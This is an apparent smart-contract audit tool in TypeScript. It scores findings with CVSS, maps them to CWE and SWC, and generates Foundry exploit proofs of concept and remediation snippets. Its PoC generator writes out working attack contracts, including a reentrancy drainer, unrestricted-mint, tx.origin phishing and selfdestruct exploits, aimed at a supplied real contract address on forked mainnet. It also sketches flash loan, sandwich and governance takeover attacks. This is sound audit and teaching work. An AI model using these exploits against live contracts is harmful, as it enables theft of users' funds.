// ═══════════════════════════════════════════════════════════════════
// SOLAY39 — Enterprise Standards
// CVSS v3.1 · CWE · SWC · SHA-256 · Dual Review · Economic Attacks
// ═══════════════════════════════════════════════════════════════════

// ─── TYPES ────────────────────────────────────────────────────────

export interface CVSSv3 {
  vectorString: string
  baseScore: number
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "NONE"
  attackVector: "N" | "A" | "L" | "P"
  attackComplexity: "L" | "H"
  privilegesRequired: "N" | "L" | "H"
  userInteraction: "N" | "R"
  scope: "U" | "C"
  confidentialityImpact: "H" | "L" | "N"
  integrityImpact: "H" | "L" | "N"
  availabilityImpact: "H" | "L" | "N"
}

export interface CWEEntry {
  id: string
  name: string
  url: string
}

export interface SWCEntry {
  id: string
  name: string
  url: string
}

export interface ReportIntegrity {
  reportId: string
  sha256: string
  timestamp: string
  auditorSignature: string
  verificationUrl: string
}

export interface ReviewerProfile {
  name: string
  role: "Lead Auditor" | "Second Reviewer" | "QA Approver"
  credentials: string
  signedOff: boolean
  signOffDate?: string
}

export interface DoubleReviewRecord {
  leadAuditor: ReviewerProfile
  secondReviewer?: ReviewerProfile
  qaApprover?: ReviewerProfile
  reviewStatus: "SINGLE_REVIEW" | "DOUBLE_REVIEW" | "QA_APPROVED"
  conflictsFound: string[]
  consensusReached: boolean
}

export interface EconomicAttackVector {
  type: "flash-loan" | "oracle-manipulation" | "mev-sandwich" | "liquidity-drain" | "governance-takeover" | "price-manipulation"
  title: string
  applicable: boolean
  severity: "High" | "Medium" | "Low" | "N/A"
  description: string
  exploitCondition: string
  estimatedLoss: string
  mitigation: string
  pocSketch: string
}

// ─── CVSS AUTO-CALCULATOR ─────────────────────────────────────────

export function computeCVSS(findingTitle: string, severity: string): CVSSv3 {
  const t = findingTitle.toLowerCase()

  const defaults: Record<string, CVSSv3> = {
    CRITICAL: {
      vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      baseScore: 9.8, severity: "CRITICAL",
      attackVector: "N", attackComplexity: "L", privilegesRequired: "N",
      userInteraction: "N", scope: "U",
      confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H",
    },
    HIGH: {
      vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
      baseScore: 8.1, severity: "HIGH",
      attackVector: "N", attackComplexity: "L", privilegesRequired: "L",
      userInteraction: "N", scope: "U",
      confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "N",
    },
    MEDIUM: {
      vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",
      baseScore: 4.2, severity: "MEDIUM",
      attackVector: "N", attackComplexity: "H", privilegesRequired: "L",
      userInteraction: "N", scope: "U",
      confidentialityImpact: "L", integrityImpact: "L", availabilityImpact: "N",
    },
    LOW: {
      vectorString: "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:N/I:L/A:N",
      baseScore: 1.8, severity: "LOW",
      attackVector: "L", attackComplexity: "H", privilegesRequired: "H",
      userInteraction: "R", scope: "U",
      confidentialityImpact: "N", integrityImpact: "L", availabilityImpact: "N",
    },
    INFO: {
      vectorString: "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:N",
      baseScore: 0.0, severity: "NONE",
      attackVector: "N", attackComplexity: "H", privilegesRequired: "H",
      userInteraction: "R", scope: "U",
      confidentialityImpact: "N", integrityImpact: "N", availabilityImpact: "N",
    },
  }

  let base: CVSSv3 = { ...(defaults[severity] ?? defaults["MEDIUM"]) }

  if (t.includes("reentrancy"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", baseScore: 9.8, severity: "CRITICAL", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H" }
  else if (t.includes("overflow") || t.includes("underflow"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  else if (t.includes("selfdestruct") || t.includes("self destruct"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H", baseScore: 9.1, severity: "CRITICAL", attackVector: "N", attackComplexity: "L", privilegesRequired: "H", scope: "C", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H" }
  else if (t.includes("tx.origin"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N", baseScore: 7.4, severity: "HIGH", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "N" }
  else if (t.includes("unrestricted") && t.includes("mint"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  else if ((t.includes("mint") || t.includes("pause")) && t.includes("centrali"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N", baseScore: 2.7, severity: "LOW", attackVector: "N", attackComplexity: "L", privilegesRequired: "H", confidentialityImpact: "N", integrityImpact: "L", availabilityImpact: "N" }
  else if (t.includes("pragma") || t.includes("floating"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N", baseScore: 3.7, severity: "LOW", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "L", availabilityImpact: "N" }
  else if (t.includes("delegatecall"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H", baseScore: 8.5, severity: "HIGH", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", scope: "C", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H" }
  else if (t.includes("flash loan") || t.includes("flashloan"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  else if (t.includes("oracle"))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 5.9, severity: "MEDIUM", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  else if (t.includes("access control") && (t.includes("missing") || t.includes("broken")))
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }

  return base
}

// ─── CWE MAP ──────────────────────────────────────────────────────

const CWE_MAP: Record<string, CWEEntry> = {
  "reentrancy":       { id: "CWE-841", name: "Improper Enforcement of Behavioral Workflow", url: "https://cwe.mitre.org/data/definitions/841.html" },
  "access control":   { id: "CWE-284", name: "Improper Access Control", url: "https://cwe.mitre.org/data/definitions/284.html" },
  "overflow":         { id: "CWE-190", name: "Integer Overflow or Wraparound", url: "https://cwe.mitre.org/data/definitions/190.html" },
  "underflow":        { id: "CWE-191", name: "Integer Underflow", url: "https://cwe.mitre.org/data/definitions/191.html" },
  "selfdestruct":     { id: "CWE-664", name: "Improper Control of a Resource Through its Lifetime", url: "https://cwe.mitre.org/data/definitions/664.html" },
  "self destruct":    { id: "CWE-664", name: "Improper Control of a Resource Through its Lifetime", url: "https://cwe.mitre.org/data/definitions/664.html" },
  "tx.origin":        { id: "CWE-290", name: "Authentication Bypass by Spoofing", url: "https://cwe.mitre.org/data/definitions/290.html" },
  "timestamp":        { id: "CWE-330", name: "Use of Insufficiently Random Values", url: "https://cwe.mitre.org/data/definitions/330.html" },
  "delegatecall":     { id: "CWE-829", name: "Inclusion of Functionality from Untrusted Control Sphere", url: "https://cwe.mitre.org/data/definitions/829.html" },
  "flash loan":       { id: "CWE-362", name: "Race Condition", url: "https://cwe.mitre.org/data/definitions/362.html" },
  "flashloan":        { id: "CWE-362", name: "Race Condition", url: "https://cwe.mitre.org/data/definitions/362.html" },
  "oracle":           { id: "CWE-20",  name: "Improper Input Validation", url: "https://cwe.mitre.org/data/definitions/20.html" },
  "unchecked":        { id: "CWE-252", name: "Unchecked Return Value", url: "https://cwe.mitre.org/data/definitions/252.html" },
  "mint":             { id: "CWE-284", name: "Improper Access Control", url: "https://cwe.mitre.org/data/definitions/284.html" },
  "pragma":           { id: "CWE-693", name: "Protection Mechanism Failure", url: "https://cwe.mitre.org/data/definitions/693.html" },
  "floating":         { id: "CWE-693", name: "Protection Mechanism Failure", url: "https://cwe.mitre.org/data/definitions/693.html" },
  "pause":            { id: "CWE-284", name: "Improper Access Control", url: "https://cwe.mitre.org/data/definitions/284.html" },
}

const SWC_MAP: Record<string, SWCEntry> = {
  "reentrancy":       { id: "SWC-107", name: "Reentrancy", url: "https://swcregistry.io/docs/SWC-107" },
  "access control":   { id: "SWC-105", name: "Unprotected Ether Withdrawal", url: "https://swcregistry.io/docs/SWC-105" },
  "overflow":         { id: "SWC-101", name: "Integer Overflow and Underflow", url: "https://swcregistry.io/docs/SWC-101" },
  "underflow":        { id: "SWC-101", name: "Integer Overflow and Underflow", url: "https://swcregistry.io/docs/SWC-101" },
  "selfdestruct":     { id: "SWC-106", name: "Unprotected SELFDESTRUCT Instruction", url: "https://swcregistry.io/docs/SWC-106" },
  "self destruct":    { id: "SWC-106", name: "Unprotected SELFDESTRUCT Instruction", url: "https://swcregistry.io/docs/SWC-106" },
  "tx.origin":        { id: "SWC-115", name: "Authorization through tx.origin", url: "https://swcregistry.io/docs/SWC-115" },
  "timestamp":        { id: "SWC-116", name: "Block values as a proxy for time", url: "https://swcregistry.io/docs/SWC-116" },
  "delegatecall":     { id: "SWC-112", name: "Delegatecall to Untrusted Callee", url: "https://swcregistry.io/docs/SWC-112" },
  "unchecked":        { id: "SWC-104", name: "Unchecked Call Return Value", url: "https://swcregistry.io/docs/SWC-104" },
  "pragma":           { id: "SWC-103", name: "Floating Pragma", url: "https://swcregistry.io/docs/SWC-103" },
  "floating":         { id: "SWC-103", name: "Floating Pragma", url: "https://swcregistry.io/docs/SWC-103" },
  "flash loan":       { id: "SWC-107", name: "Reentrancy (Flash Loan variant)", url: "https://swcregistry.io/docs/SWC-107" },
}

export function getCWE(findingTitle: string): CWEEntry {
  const t = findingTitle.toLowerCase()
  for (const [key, entry] of Object.entries(CWE_MAP)) {
    if (t.includes(key)) return entry
  }
  return { id: "CWE-703", name: "Improper Check or Handling of Exceptional Conditions", url: "https://cwe.mitre.org/data/definitions/703.html" }
}

export function getSWC(findingTitle: string): SWCEntry | null {
  const t = findingTitle.toLowerCase()
  for (const [key, entry] of Object.entries(SWC_MAP)) {
    if (t.includes(key)) return entry
  }
  return null
}

// ─── REPORT INTEGRITY (SHA-256) ───────────────────────────────────

export async function computeReportHash(reportJson: string): Promise<string> {
  const encoder = new TextEncoder()
  const data = encoder.encode(reportJson)
  const hashBuffer = await crypto.subtle.digest("SHA-256", data)
  const hashArray = Array.from(new Uint8Array(hashBuffer))
  return hashArray.map(b => b.toString(16).padStart(2, "0")).join("")
}

export function buildReportIntegrity(auditId: string, sha256: string): ReportIntegrity {
  return {
    reportId: `solay39-audit-${auditId}`,
    sha256,
    timestamp: new Date().toISOString(),
    auditorSignature: "Solay39 Founder — cryptographically bound to report content",
    verificationUrl: `https://www.solay39.eu/verify/${auditId}`,
  }
}

// ─── DOUBLE REVIEWER ──────────────────────────────────────────────

export function buildDefaultReviewRecord(leadName = "Solay39 Founder"): DoubleReviewRecord {
  return {
    leadAuditor: {
      name: leadName,
      role: "Lead Auditor",
      credentials: "Smart contract security specialist — manual adversarial review, EVM bytecode analysis",
      signedOff: true,
      signOffDate: new Date().toISOString().slice(0, 10),
    },
    reviewStatus: "SINGLE_REVIEW",
    conflictsFound: [],
    consensusReached: true,
  }
}

// ─── ECONOMIC ATTACK ANALYSIS ─────────────────────────────────────

export function analyzeEconomicAttacks(
  sourceCode: string,
  meta: {
    hasProxy?: boolean
    hasMint?: boolean
    hasExternalCalls?: boolean
    hasPausable?: boolean
    hasBlacklist?: boolean
    contractType?: string
  }
): EconomicAttackVector[] {
  const src = sourceCode.toLowerCase()
  const isDeFi = (
    /function\s+swap|function\s+addLiquidity|function\s+removeLiquidity/i.test(src) ||
    /function\s+deposit|function\s+withdraw|function\s+borrow/i.test(src) ||
    /IUniswap|IPancakeRouter|IPool|IVault/i.test(src)
  )
  const hasOracle = /chainlink|oracle|price.*feed|latestanswer|getlatestprice|twap/.test(src)
  const hasGov = (
    /function\s+propose\s*\(|function\s+vote\s*\(|function\s+castVote\s*\(/i.test(src) ||
    /function\s+queue\s*\(|function\s+execute\s*\(|TimelockController/i.test(src) ||
    (/governance|IGovernor|GovernorBravo/i.test(src) && /function\s+\w+\s*\(/i.test(src))
  )
  const hasLiq = (
    /function\s+addLiquidity|function\s+removeLiquidity/i.test(src) ||
    /IUniswapV[23]Pair|IPancakePair/i.test(src)
  )

  return [
    {
      type: "flash-loan",
      applicable: isDeFi || hasOracle,
      severity: isDeFi ? "High" : "Low",
      title: "Flash Loan Price Manipulation",
      description: isDeFi
        ? "Contract interacts with price-sensitive DeFi logic. A flash loan can temporarily manipulate on-chain prices to exploit miscalculated values."
        : "No price-sensitive DeFi logic detected. Flash loan attack surface is minimal.",
      exploitCondition: isDeFi
        ? "Flash loan source (Aave/dYdX) + price-sensitive function + no TWAP oracle"
        : "Not applicable",
      estimatedLoss: isDeFi ? "Up to 100% of funds in affected pool" : "N/A",
      mitigation: isDeFi
        ? "Use TWAP oracles (Uniswap v3 TWAP, Chainlink), add reentrancy guards, validate price bounds"
        : "No action required",
      pocSketch: isDeFi ? `// Foundry PoC — Flash Loan Attack
contract FlashLoanAttack {
  function attack() external {
    // 1. Borrow tokens via Aave flash loan
    // 2. Manipulate pool price via large swap
    // 3. Call vulnerable function at manipulated price
    // 4. Repay flash loan + extract profit
  }
}` : "N/A — not applicable",
    },
    {
      type: "oracle-manipulation",
      applicable: hasOracle,
      severity: hasOracle ? "Medium" : "Low",
      title: "Oracle Price Feed Manipulation",
      description: hasOracle
        ? "Contract reads from an external price oracle. Spot price oracles without freshness checks can be manipulated by sufficiently capitalized attackers."
        : "No oracle dependency detected.",
      exploitCondition: hasOracle
        ? "Access to oracle feed + sufficient liquidity + no heartbeat/staleness check"
        : "Not applicable",
      estimatedLoss: hasOracle ? "Dependent on oracle-gated TVL" : "N/A",
      mitigation: hasOracle
        ? "Implement Chainlink with staleness check: require(updatedAt > block.timestamp - 3600). Use TWAP for DEX pricing."
        : "No action required",
      pocSketch: hasOracle ? `// Oracle staleness bypass
// If: (, int price,,,) = oracle.latestRoundData();
// Without checking updatedAt → stale price accepted
// Attack during oracle downtime period` : "N/A",
    },
    {
      type: "mev-sandwich",
      applicable: hasLiq || /swap|trade|exchange/.test(src),
      severity: hasLiq ? "Medium" : "Low",
      title: "MEV Sandwich Attack",
      description: hasLiq
        ? "Swap/trade transactions can be front-run and back-run by MEV bots, sandwiching victim transactions to extract value."
        : "No AMM swap logic detected. MEV sandwich attack surface is minimal.",
      exploitCondition: "Mempool visibility + no slippage protection + no deadline parameter",
      estimatedLoss: "0.1% - 5% per transaction depending on liquidity depth",
      mitigation: "Enforce slippage tolerance (amountOutMin), add deadline parameter, use Flashbots Protect",
      pocSketch: hasLiq ? `// MEV Sandwich
// 1. Detect victim swap in public mempool
// 2. Front-run: buy token, push price up
// 3. Victim executes at worse price
// 4. Back-run: sell at inflated price` : "N/A",
    },
    {
      type: "governance-takeover",
      applicable: hasGov,
      severity: hasGov ? "High" : "Low",
      title: "Governance Flash Loan Takeover",
      description: hasGov
        ? "If voting power is based on token balance without time-lock, a flash loan can acquire temporary majority to pass malicious proposals."
        : "No governance mechanism detected.",
      exploitCondition: hasGov
        ? "Flash-loanable governance token + no timelock + quorum below flash loan capital"
        : "Not applicable",
      estimatedLoss: hasGov ? "Total protocol treasury and parameter control" : "N/A",
      mitigation: hasGov
        ? "Use vote-escrowed tokens (veToken), implement 48h+ timelock, require quorum > flash loan capacity"
        : "No action required",
      pocSketch: hasGov ? `// Governance takeover
// 1. Flash loan governance tokens
// 2. Create + self-vote malicious proposal
// 3. No timelock → execute immediately
// 4. Drain treasury / alter critical params` : "N/A",
    },
    {
      type: "liquidity-drain",
      applicable: !!meta.hasMint && hasLiq,
      severity: meta.hasMint && hasLiq ? "Medium" : "Low",
      title: "Liquidity Drain via Uncapped Mint",
      description: meta.hasMint
        ? "A compromised owner/minter can inflate token supply and dump freshly minted tokens into active liquidity pools, draining paired assets."
        : "No uncapped mint detected. Liquidity drain via inflation is not applicable.",
      exploitCondition: "Compromised minter key + active DEX liquidity pool",
      estimatedLoss: "Up to 100% of pool liquidity",
      mitigation: "Supply cap, multisig for minter role, timelock on mint operations",
      pocSketch: meta.hasMint ? `// Liquidity drain via compromised mint
// 1. Attacker compromises minter key
// 2. mint(attacker, MAX_UINT256)
// 3. Swap minted tokens into DEX pool
// 4. Extract paired asset (ETH/USDC)` : "N/A",
    },
  ]
}

// ─── FOUNDRY PoC GENERATOR ────────────────────────────────────────

export function generateFoundryPoC(
  findingTitle: string,
  contractName: string,
  contractAddress: string,
): string {
  // Sanitize address
  const addr = contractAddress && contractAddress.startsWith("0x") && contractAddress.length >= 10
    ? contractAddress
    : "0x_REPLACE_WITH_CONTRACT_ADDRESS"

  const t = findingTitle.toLowerCase()
  const header = [
    "// SPDX-License-Identifier: MIT",
    "pragma solidity ^0.8.20;",
    'import "forge-std/Test.sol";',
    "",
  ].join("\n")

  if (t.includes("reentrancy")) {
    return [
      header,
      "// Solay39 PoC — Reentrancy",
      "// Finding: " + findingTitle,
      "// Target: " + contractName + " @ " + addr,
      "",
      "interface ITarget { function withdraw() external; function deposit() external payable; }",
      "",
      "contract ReentrancyAttacker {",
      "    ITarget public target;",
      "    uint public depth;",
      "    constructor(address t) { target = ITarget(t); }",
      "    receive() external payable {",
      "        if (depth++ < 5) target.withdraw();",
      "    }",
      "    function attack() external payable {",
      "        target.deposit{value: msg.value}();",
      "        target.withdraw();",
      "    }",
      "}",
      "",
      "contract ReentrancyTest is Test {",
      "    function testExploit() public {",
      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
      "        ReentrancyAttacker atk = new ReentrancyAttacker(" + addr + ");",
      "        uint before = address(" + addr + ").balance;",
      "        atk.attack{value: 1 ether}();",
      '        assertLt(address(' + addr + ').balance, before, "Reentrancy drained funds");',
      "    }",
      "}",
    ].join("\n")
  }

  if (t.includes("overflow") || t.includes("underflow")) {
    return [
      header,
      "// Solay39 PoC — Integer Overflow/Underflow",
      "// Finding: " + findingTitle,
      "// Target: " + contractName + " @ " + addr,
      "",
      "interface IToken {",
      "    function transfer(address, uint256) external returns (bool);",
      "    function balanceOf(address) external view returns (uint256);",
      "}",
      "",
      "contract OverflowTest is Test {",
      "    function testExploit() public {",
      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
      "        IToken token = IToken(" + addr + ");",
      '        address attacker = makeAddr("attacker");',
      "        vm.prank(attacker);",
      "        token.transfer(address(this), type(uint256).max);",
      '        assertGt(token.balanceOf(attacker), 1e30, "Underflow confirmed");',
      "    }",
      "}",
    ].join("\n")
  }

  if (t.includes("tx.origin")) {
    return [
      header,
      "// Solay39 PoC — tx.origin Phishing",
      "// Finding: " + findingTitle,
      "// Target: " + contractName + " @ " + addr,
      "",
      "interface ITarget { function adminFunction() external; }",
      "",
      "contract PhishingContract {",
      "    ITarget public target;",
      "    constructor(address t) { target = ITarget(t); }",
      "    function lure() external { target.adminFunction(); }",
      "}",
      "",
      "contract TxOriginTest is Test {",
      "    function testExploit() public {",
      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
      "        // Replace with actual owner address from BscScan/Etherscan",
      "        address owner = address(0x1234);",
      "        PhishingContract phisher = new PhishingContract(" + addr + ");",
      "        vm.prank(owner, owner);",
      "        phisher.lure();",
      "    }",
      "}",
    ].join("\n")
  }

  if (t.includes("unrestricted") && t.includes("mint")) {
    return [
      header,
      "// Solay39 PoC — Unrestricted Mint",
      "// Finding: " + findingTitle,
      "// Target: " + contractName + " @ " + addr,
      "",
      "interface IToken {",
      "    function mint(address, uint256) external;",
      "    function totalSupply() external view returns (uint256);",
      "}",
      "",
      "contract UnrestrictedMintTest is Test {",
      "    function testExploit() public {",
      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
      "        IToken token = IToken(" + addr + ");",
      '        address attacker = makeAddr("attacker");',
      "        uint256 before = token.totalSupply();",
      "        vm.prank(attacker);",
      "        token.mint(attacker, 1_000_000_000 ether);",
      '        assertGt(token.totalSupply(), before, "Unrestricted mint confirmed");',
      "    }",
      "}",
    ].join("\n")
  }

  if (t.includes("selfdestruct") || t.includes("self destruct")) {
    return [
      header,
      "// Solay39 PoC — Self Destruct",
      "// Finding: " + findingTitle,
      "// Target: " + contractName + " @ " + addr,
      "",
      "interface ITarget { function destroy() external; }",
      "interface IOwnable { function owner() external view returns (address); }",
      "",
      "contract SelfDestructTest is Test {",
      "    function testExploit() public {",
      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
      "        ITarget target = ITarget(" + addr + ");",
      "        uint256 codeSizeBefore;",
      "        assembly { codeSizeBefore := extcodesize(" + addr + ") }",
      "        // Prank as owner",
      "        address owner = IOwnable(" + addr + ").owner();",
      "        vm.prank(owner);",
      "        target.destroy();",
      "        uint256 codeSizeAfter;",
      "        assembly { codeSizeAfter := extcodesize(" + addr + ") }",
      '        assertEq(codeSizeAfter, 0, "Contract destroyed");',
      "    }",
      "}",
    ].join("\n")
  }

  if (t.includes("access control")) {
    return [
      header,
      "// Solay39 PoC — Missing Access Control",
      "// Finding: " + findingTitle,
      "// Target: " + contractName + " @ " + addr,
      "",
      "interface ITarget { function privilegedFunction() external; }",
      "",
      "contract AccessControlTest is Test {",
      "    function testExploit() public {",
      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
      "        ITarget target = ITarget(" + addr + ");",
      '        address attacker = makeAddr("attacker");',
      "        // Should revert — if it does not, access control is missing",
      "        vm.prank(attacker);",
      "        target.privilegedFunction();",
      "    }",
      "}",
    ].join("\n")
  }

  // Generic fallback
  return [
    header,
    "// Solay39 PoC — " + findingTitle,
    "// Target: " + contractName + " @ " + addr,
    "",
    "contract PoCTest is Test {",
    "    address constant TARGET = " + addr + ";",
    "",
    "    function testExploit() public {",
    '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
    "        // Target: " + addr,
    "        // Implement exploit steps for: " + findingTitle,
    "        // 1. Setup attack preconditions",
    "        // 2. Execute vulnerable function",
    "        // 3. Assert impact (balance change / state corruption)",
    "        // Run: forge test --match-test testExploit -vvvv",
    "    }",
    "}",
  ].join("\n")
}

// ─── REMEDIATION CODE GENERATOR ──────────────────────────────────

export function generateRemediationExample(findingTitle: string, severity: string): string | null {
  const t = findingTitle.toLowerCase()
  if (severity === "INFO") return null

  if (t.includes("reentrancy")) return [
    '// Fix: Apply Checks-Effects-Interactions pattern + ReentrancyGuard',
    'import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";',
    '',
    'contract Fixed is ReentrancyGuard {',
    '    mapping(address => uint256) private balances;',
    '',
    '    // BEFORE (vulnerable):',
    '    // function withdraw() external {',
    '    //     uint256 amount = balances[msg.sender];',
    '    //     (bool success,) = msg.sender.call{value: amount}("");',
    '    //     balances[msg.sender] = 0;  // state update AFTER call',
    '    // }',
    '',
    '    // AFTER (fixed):',
    '    function withdraw() external nonReentrant {',
    '        uint256 amount = balances[msg.sender];',
    '        balances[msg.sender] = 0;                    // state update FIRST',
    '        (bool success,) = msg.sender.call{value: amount}("");  // external call LAST',
    '        require(success, "Transfer failed");',
    '    }',
    '}',
  ].join("\n")

  if (t.includes("unrestricted") && t.includes("mint")) return [
    '// Fix: Add access control to mint function',
    'import "@openzeppelin/contracts/access/AccessControl.sol";',
    '',
    'contract Fixed is ERC20, AccessControl {',
    '    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");',
    '',
    '    constructor() {',
    '        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);',
    '        _grantRole(MINTER_ROLE, msg.sender);',
    '    }',
    '',
    '    // BEFORE (vulnerable):',
    '    // function mint(address to, uint256 amount) external {',
    '    //     _mint(to, amount);  // no access control',
    '    // }',
    '',
    '    // AFTER (fixed):',
    '    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {',
    '        _mint(to, amount);',
    '    }',
    '}',
  ].join("\n")

  if (t.includes("access control") || t.includes("centrali")) return [
    '// Fix: Implement multisig governance + timelock',
    '// Deploy Gnosis Safe (https://safe.global) as admin',
    '// Then wrap critical functions with timelock:',
    '',
    'import "@openzeppelin/contracts/governance/TimelockController.sol";',
    '',
    '// In your deployment script:',
    '// 1. Deploy TimelockController(minDelay=48h, proposers=[multisig], executors=[multisig])',
    '// 2. Transfer contract ownership to TimelockController address',
    '// 3. All admin operations now require 48h delay + multisig approval',
    '',
    'modifier onlyGovernance() {',
    '    require(msg.sender == address(timelockController), "Use governance");',
    '    _;',
    '}',
    '',
    '// Example protected function:',
    'function setParameter(uint256 newValue) external onlyGovernance {',
    '    parameter = newValue;',
    '    emit ParameterChanged(newValue);',
    '}',
  ].join("\n")

  if (t.includes("pragma") || t.includes("floating")) return [
    '// Fix: Pin exact compiler version',
    '// BEFORE (floating \u2014 allows any 0.8.x):',
    '// pragma solidity ^0.8.20;',
    '',
    '// AFTER (pinned \u2014 deterministic compilation):',
    'pragma solidity 0.8.20;',
    '',
    '// Also update your build config:',
    '// foundry.toml  \u2192 solc = "0.8.20"',
    '// hardhat.config.ts \u2192 solidity: { version: "0.8.20" }',
  ].join("\n")

  if (t.includes("selfdestruct") || t.includes("self destruct")) return [
    '// Fix: Remove selfdestruct or add strict access control',
    '// Option A - Remove entirely (recommended):',
    '// Delete the selfdestruct() call. Use a pause mechanism instead.',
    '',
    '// Option B - Restrict with multisig + timelock:',
    'function emergencyShutdown() external onlyRole(EMERGENCY_ROLE) {',
    '    require(',
    '        IMultisig(multisig).hasApproval(SHUTDOWN_OPERATION_ID, REQUIRED_APPROVALS),',
    '        "Requires multisig approval"',
    '    );',
    '    selfdestruct(payable(treasury));',
    '}',
  ].join("\n")

  if (t.includes("tx.origin")) return [
    '// Fix: Replace tx.origin with msg.sender',
    '// BEFORE (vulnerable):',
    '// require(tx.origin == owner, "Not owner");  // phishable',
    '',
    '// AFTER (fixed):',
    'require(msg.sender == owner, "Not owner");',
    '',
    '// If you need to distinguish EOA from contract caller, use:',
    'require(msg.sender == tx.origin, "No contract callers");  // restricts to EOA only',
    '// OR use OpenZeppelin EIP-712 signatures for meta-transactions',
  ].join("\n")

  if (t.includes("overflow") || t.includes("underflow")) return [
    '// Fix: Upgrade to Solidity >= 0.8.0 (built-in overflow checks)',
    '// BEFORE (Solidity < 0.8.0):',
    '// pragma solidity ^0.4.18;',
    '// uint256 result = a + b;  // silent overflow possible',
    '',
    '// Option A - Upgrade compiler (recommended):',
    'pragma solidity 0.8.20;',
    'uint256 result = a + b;  // reverts on overflow automatically',
    '',
    '// Option B - If stuck on old compiler, use SafeMath:',
    'import "@openzeppelin/contracts/utils/math/SafeMath.sol";',
    'using SafeMath for uint256;',
    'uint256 result = a.add(b);  // explicit overflow check',
  ].join("\n")

  if (t.includes("oracle")) return [
    '// Fix: Implement Chainlink oracle with staleness check',
    'import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";',
    '',
    'contract Fixed {',
    '    AggregatorV3Interface internal priceFeed;',
    '    uint256 constant STALENESS_THRESHOLD = 3600; // 1 hour',
    '',
    '    function getPrice() internal view returns (int256) {',
    '        (',
    '            uint80 roundId,',
    '            int256 price,',
    '            uint256 startedAt,',
    '            uint256 updatedAt,',
    '            uint80 answeredInRound',
    '        ) = priceFeed.latestRoundData();',
    '',
    '        require(price > 0, "Invalid price");',
    '        require(updatedAt >= block.timestamp - STALENESS_THRESHOLD, "Stale price");',
    '        require(answeredInRound >= roundId, "Incomplete round");',
    '',
    '        return price;',
    '    }',
    '}',
  ].join("\n")

  // Generic fix
  return [
    "// Fix recommendation for: " + findingTitle,
    "// Severity: " + severity,
    "//",
    "// 1. Review the identified vulnerability in context",
    "// 2. Apply principle of least privilege",
    "// 3. Add appropriate access controls",
    "// 4. Add input validation where missing",
    "// 5. Test fix with: forge test --match-test testFix -vvvv",
    "// 6. Request re-audit of modified function",
  ].join("\n")
}
